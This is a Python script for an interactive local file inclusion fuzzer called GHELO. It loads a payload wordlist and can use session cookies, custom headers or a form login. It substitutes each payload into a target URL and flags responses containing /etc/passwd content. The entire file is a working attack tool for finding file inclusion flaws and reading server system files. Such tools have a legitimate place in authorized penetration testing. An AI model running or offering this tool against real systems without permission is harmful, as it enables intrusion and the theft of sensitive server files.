import requests
from collections import defaultdict

ascii_art = r"""
  ________  __    __   _______  __        ______   
 /  _____/ |  |  |  | |   ____||  |      /  __  \  
|  |  __   |  |__|  | |  |__   |  |     |  |  |  | 
|  | |_ |  |   __   | |   __|  |  |     |  |  |  | 
|  |__| |  |  |  |  | |  |____ |  `----.|  `--'  | 
 \______|  |__|  |__| |_______||_______| \______/  

        GHELO - Local File Inclusion Service.. 
                By: @hhkolberg
---------------------------------------------------
"""

def main():
    print(ascii_art)

    url = input("[+] Enter target URL (use FUZZ where payload goes): ").strip()
    if "FUZZ" not in url:
        print("[-] You must include 'FUZZ' in the URL.")
        return

    wordlist_path = input("[+] Enter path to wordlist (e.g. lfi.txt): ").strip()
    try:
        with open(wordlist_path, "r") as f:
            payloads = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Failed to load wordlist: {e}")
        return

    ignores_input = input("[+] Enter status codes to ignore (comma-separated, or leave empty): ").strip()
    ignores = [int(code) for code in ignores_input.split(",") if code.isdigit()]

    # Initialize session and default headers
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; Fjallfang-LFI-Fuzzer/1.0)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    # Interactive authentication setup
    auth_required = input("[+] Does this target require authentication? (y/N): ").strip().lower() == 'y'
    if auth_required:
        print("Choose authentication method:")
        print("  1) Paste full Cookie header")
        print("  2) Add custom header (e.g. Authorization)")
        print("  3) Perform form-based login")
        choice = input("Method [1-3]: ").strip()

        if choice == '1':
            cookie = input("[+] Paste Cookie string (e.g. PHPSESSID=abcd; other=...): ").strip()
            session.headers.update({"Cookie": cookie})
        elif choice == '2':
            name = input("[+] Header name (e.g. Authorization): ").strip()
            value = input(f"[+] Value for {name}: ").strip()
            session.headers.update({name: value})
        elif choice == '3':
            login_url = input("[+] Login form URL: ").strip()
            user_field = input("[+] Username field name: ").strip()
            pass_field = input("[+] Password field name: ").strip()
            username = input("[+] Username: ").strip()
            password = input("[+] Password: ").strip()
            try:
                resp = session.post(login_url,
                                    data={user_field: username, pass_field: password},
                                    timeout=10)
                if resp.status_code in (200, 302):
                    print("[+] Login request sent (status {}), using session cookies.".format(resp.status_code))
                else:
                    print(f"[-] Login may have failed (status {resp.status_code}).")
            except Exception as e:
                print(f"[-] Login request error: {e}")
        else:
            print("[-] Invalid choice, continuing without additional auth headers.")

    print("\n🚀 Starting fuzzing with grouping by status & length...\n")
    response_groups = defaultdict(list)

    for payload in payloads:
        test_url = url.replace("FUZZ", payload)
        print(f"[>] Testing: {test_url}")
        try:
            r = session.get(test_url, timeout=5, allow_redirects=False)
            code = r.status_code
            length = len(r.text)

            # Heuristic scan for passwd
            if b"root:x:" in r.content:
                print(f"[!] Found possible /etc/passwd with payload '{payload}':\n{r.text[:200]}...\n")

            if code in ignores:
                continue

            response_groups[(code, length)].append(payload)

        except Exception as e:
            print(f"[-] Request failed for {payload}: {e}")

    print("\n📊 Response Summary:\n")
    for (code, length), pl in sorted(response_groups.items(), key=lambda x: len(x[1]), reverse=True):
        print(f"[{code}] Length={length}: {len(pl)} payloads")
        for p in pl:
            print(f"    - {p}")
        print()

if __name__ == "__main__":
    main()

